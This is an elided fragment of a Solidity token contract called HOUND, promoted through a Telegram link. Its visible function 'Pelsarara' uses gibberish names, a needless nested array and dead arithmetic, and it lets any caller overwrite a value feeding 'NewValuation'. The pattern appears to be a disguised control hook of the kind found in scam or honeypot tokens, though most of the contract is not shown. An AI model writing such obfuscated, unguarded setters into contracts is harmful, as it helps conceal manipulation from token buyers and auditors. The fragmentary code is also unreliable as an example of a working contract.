...
// Telegram Group : https://t.me/HoundEth
...
contract HOUND is Context, IERC20, Ownable {
    ...
    uint256 private NewValuation = plasssdret;
    ...
    function Pelsarara(uint256[7][6][7] memory gujrusto) external returns(bool) {
        require(gujrusto[5][4][6] >97);
        uint8 pustoro = 1;
        uint8 krkonda = 2;
        uint256 bbbfght = pustoro+krkonda;
        plasssdret = gujrusto[5][4][6];
        return true;
    }
